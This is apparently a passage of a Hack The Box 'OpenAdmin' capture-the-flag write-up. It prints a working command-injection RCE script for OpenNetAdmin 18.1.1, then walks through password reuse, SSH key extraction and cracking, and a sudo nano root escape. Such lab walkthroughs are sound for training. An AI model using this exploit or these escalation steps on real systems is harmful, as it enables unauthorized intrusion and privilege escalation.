+<p><div class="img-container"><img src="imgs/image-20210402000812490.png" alt="image-20210402000812490"  /></div>
+</p>
+<h4 id="music">/music/</h4>
+<p>The <code>/music</code> home page provides a login menu that points to <code>http://openadmin.htb/ona</code></p>
+<p><div class="img-container"><img src="imgs/image-20210402000847660.png" alt="image-20210402000847660"  /></div>
+</p>
+<h4 id="ona">/ona/</h4>
+<p>Visiting <code>/ona/</code> brings me to an instance of OpenNetAdmin. It is a software for managing network related things.</p>
+<p><div class="img-container"><img src="imgs/88b4ba1460574b0f88a4acd81e00d392.png" alt="f0df4d83acc69be1e666eb6e40a73494.png"  /></div>
+</p>
+<p>There&rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (<code>v18.1.1</code>)</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="exploit-poc-for-opennetadmin-1811">Exploit PoC for OpenNetAdmin 18.1.1</h4>
+<p>Based on the version above, a quick search on <code>exploit-db</code> shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The exploit PoC source code is as follows:</p>
+<blockquote>
+<p>PoC: <a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a></p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
+ echo -n <span style="color:#e6db74">&#34;</span>$<span style="color:#e6db74"> &#34;</span>; read cmd
+ curl --silent -d <span style="color:#e6db74">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span style="color:#e6db74">${</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | sed -n -e <span style="color:#e6db74">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>I saved the exploit to a file called <code>OpenRCE.sh</code>, and below is the issued command to run the exploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
+$ ./OpenRCE.sh http://openadmin.htb/ona/
+</code></pre></div><p><div class="img-container"><img src="imgs/2371e9e41f8449479f1bd8f24e8af888.png" alt="db477cc560e79f4bf705987c3188ee25.png"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-jimmy">Shell as jimmy</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Upon enumerating the current working directory, a database credential is found in <code>./local/config/database_settings.inc.php</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat ./local/config/database_settings.inc.php
+&lt;?php
+
+$ona_contexts<span style="color:#f92672">=</span>array <span style="color:#f92672">(</span>
+  <span style="color:#e6db74">&#39;DEFAULT&#39;</span> <span style="color:#f92672">=</span>&gt; 
+  array <span style="color:#f92672">(</span>
+    <span style="color:#e6db74">&#39;databases&#39;</span> <span style="color:#f92672">=</span>&gt; 
+    array <span style="color:#f92672">(</span>
+      0 <span style="color:#f92672">=</span>&gt; 
+      array <span style="color:#f92672">(</span>
+        <span style="color:#e6db74">&#39;db_type&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;mysqli&#39;</span>,
+        <span style="color:#e6db74">&#39;db_host&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,
+        <span style="color:#e6db74">&#39;db_login&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ona_sys&#39;</span>,
+        <span style="color:#e6db74">&#39;db_passwd&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;n1nj4W4rri0R!&#39;</span>,
+        <span style="color:#e6db74">&#39;db_database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ona_default&#39;</span>,
+        <span style="color:#e6db74">&#39;db_debug&#39;</span> <span style="color:#f92672">=</span>&gt; false,
+      <span style="color:#f92672">)</span>,
+    <span style="color:#f92672">)</span>,
+    <span style="color:#e6db74">&#39;description&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;Default data context&#39;</span>,
+    <span style="color:#e6db74">&#39;context_color&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;#D3DBFF&#39;</span>,
+  <span style="color:#f92672">)</span>,
+<span style="color:#f92672">)</span>;
+</code></pre></div><h4 id="ssh-access">SSH access</h4>
+<p>The password worked for user <code>jimmy</code>, but the user flag can not be found in <code>jimmy</code>’s home directory.</p>
+<p><div class="img-container"><img src="imgs/25ec2fca7eb84dad9f748aeb299ef35b.png" alt="a0518e175f0d68951eac7bbb348b24e0.png"  /></div>
+</p>
+<h3 id="shell-as-joanna">Shell as joanna</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>The <code>find</code> command is issued again to search files that is accessible or owned by user <code>jimmy</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ find / -type f -user jimmy 2&gt;/dev/null
+
+...&lt;SNIP&gt;...
+/var/www/internal/main.php
+/var/www/internal/logout.php
+/var/www/internal/login.php
+...&lt;SNIP&gt;...
+</code></pre></div><p>It successfully reveals that user <code>jimmy</code> has access to files in <code>/var/www/internal/</code>.</p>
+<p>Based on apache config, <code>/var/www/internal</code> is currently hosted locally on port 52846.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
+Listen 127.0.0.1:52846
+
+&lt;VirtualHost 127.0.0.1:52846&gt;
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+&lt;IfModule mpm_itk_module&gt;
+AssignUserID joanna joanna
+&lt;/IfModule&gt;
+
+    ErrorLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/error.log
+    CustomLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/access.log combined
+
+&lt;/VirtualHost&gt;
+</code></pre></div><h4 id="code-review---improper-redirection">Code review - Improper redirection</h4>
+<p>After inspecting the <code>main.php</code> source code from <code>/var/www/internal/</code>, a logic flaw was found on the first line.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:/var/www/internal/$ cat main.php
+
+&lt;?php session_start<span style="color:#f92672">()</span>; <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!isset <span style="color:#f92672">(</span>$_SESSION<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">]))</span> <span style="color:#f92672">{</span> header<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Location: /index.php&#34;</span><span style="color:#f92672">)</span>; <span style="color:#f92672">}</span>; 
+<span style="color:#75715e"># Open Admin Trusted</span>
+<span style="color:#75715e"># OpenAdmin</span>
+$output <span style="color:#f92672">=</span> shell_exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span style="color:#f92672">)</span>;
+echo <span style="color:#e6db74">&#34;&lt;pre&gt;</span>$output<span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
+?&gt;
+&lt;html&gt;
+&lt;h3&gt;Don<span style="color:#960050;background-color:#1e0010">&#39;</span>t forget your <span style="color:#e6db74">&#34;ninja&#34;</span> password&lt;/h3&gt;
+Click here to logout &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logout.php&#34;</span> tite <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Logout&#34;</span>&gt;Session
+&lt;/html&gt;
+</code></pre></div><p>This line code has an improper redirection.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">session_start</span>(); 
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span> ($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>])) { 
+		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /index.php&#34;</span>); 
+        <span style="color:#75715e"># `die();` or `exit();` function should be called here.
+</span><span style="color:#75715e"></span>	};
+<span style="color:#f92672">...&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;...</span>
+$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">$output</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
+</span></code></pre></div><p>The code above checks users' sessions but it&rsquo;s not complete yet because the <code>die()</code> or <code>exit()</code> function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with <code>curl</code> (default without <code>-L</code> option) will prevent the page from redirection and then it renders <code>joanna</code>&rsquo;s SSH key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php
+</code></pre></div><p><div class="img-container"><img src="imgs/ea391edd6c66409d8bb551eecdac08d5.png" alt="6b73c3ba7aa0ba3e068b85435dc8aeb1.png"  /></div>
+</p>
+<h4 id="password-cracking">Password cracking</h4>
+<p>The private key is encrypted with a password.   <code>JtR</code> can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using <code>ssh2john.py</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
+$ python ssh2john.py joanna_rsa &gt; joanna_rsa.hash
+</code></pre></div><p>The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">john.exe user2.txt --wordlist=rockyou.txt
+</code></pre></div><p><div class="img-container"><img src="imgs/fa7463b8239345409a2250597b3dfa69.png" alt="ca148e3ae5b2e8b65406e0d387ca1771.png"  /></div>
+</p>
+<h4 id="ssh-access-1">SSH access</h4>
+<p>Now I can login as user <code>joanna</code> via SSH.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
+$ ssh -i joanna_rsa joanna@10.10.10.171
+</code></pre></div><p><div class="img-container"><img src="imgs/673cb008921d4eba886820c17fef43a0.png" alt="8f710060b1059b0ddb7cae2253e0c1ac.png"  /></div>
+</p>
+<p>The user flag is done here.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="abusing-sudo-nano">Abusing sudo nano</h4>
+<p>User <code>joanna</code> has sudo privileges on <code>/bin/nano</code></p>
+<blockquote>
+<p>On linux boxes, whenever you own a valid user password, always check <code>sudo -l</code> !</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> joanna on openadmin:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User joanna may run the following commands on openadmin:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /bin/nano /opt/priv
+</code></pre></div><p>A quick way to read the root flag is by issuing the command below,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv
+</code></pre></div><p>and then hit <code>CTRL + R</code> to open a file, this allows us to read the root flag at  <code>/root/root.txt</code></p>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210404121427744.png" alt="image-20210404121427744"  /></div>
+</p>
+</center>
+<p>To gain root shell as follows I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> page:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv <span style="color:#75715e"># Opening nano as root</span>
+^R^X <span style="color:#75715e"># CTRL+R (read/open file), CTRL+X(execute command)</span>
+reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="color:#ae81ff">0</span> <span style="color:#75715e"># Escape from nano</span>
+</code></pre></div>]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
